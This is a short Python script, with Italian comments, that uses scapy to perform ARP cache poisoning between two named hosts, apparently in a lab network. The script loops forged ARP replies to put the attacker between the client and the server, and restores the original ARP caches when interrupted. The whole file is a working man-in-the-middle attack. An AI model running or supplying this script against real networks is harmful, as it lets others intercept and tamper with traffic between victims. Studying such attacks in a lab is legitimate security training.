from scapy.all import *
import time
# IP e MAC delle vittime
client_ip, client_mac = "192.168.90.101", "02:42:ac:11:00:bb"
server_ip, server_mac = "192.168.90.100", "02:42:ac:11:00:cc"
# Invia pacchetti ARP falsi in loop
def poison():
    while True:
        send(ARP(op=2, pdst=client_ip, psrc=server_ip, hwdst=client_mac), verbose=0)
        send(ARP(op=2, pdst=server_ip, psrc=client_ip, hwdst=server_mac), verbose=0)
        time.sleep(2)
# Ripristina la cache ARP originale
def restore():
    send(ARP(op=2, pdst=client_ip, psrc=server_ip, hwsrc=server_mac, hwdst=client_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=server_ip, psrc=client_ip, hwsrc=client_mac, hwdst=server_mac), count=5, verbose=0)
try:
    poison()
except KeyboardInterrupt:
    restore()
    print("\n[+] ARP ripristinato")
